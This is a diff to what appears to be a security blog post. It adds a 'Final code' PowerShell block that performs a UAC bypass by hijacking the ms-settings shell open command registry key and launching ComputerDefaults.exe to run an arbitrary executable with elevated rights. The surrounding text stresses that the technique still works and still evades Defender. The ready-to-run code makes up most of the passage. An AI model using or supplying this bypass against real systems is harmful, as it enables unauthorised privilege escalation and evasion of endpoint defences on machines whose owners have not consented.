@@ -94,6 +94,15 @@ Bring it all together and you get the following:
 
 ![image](https://github.com/user-attachments/assets/872b4dcf-94f2-439c-a30c-8df6c75b2101)
 
+Final code:
+
+```powershell
+New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe" -Force
+Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+```
+
 And there you have it.  An age old UAC Bypass technique that still works, still bypasses UAC and STILL EVADES DEFENDER!  The irony is it's easier than all the other methods I posted last year.
 Think smarter not harder I guess.  Okay, I feel better about this blog post now.  I couldn't sit idly by while folks found this page and were likely immediately disappointed because none of the techniques I shared were still relevent.  Now there's at least one 😙  Until next time!
 
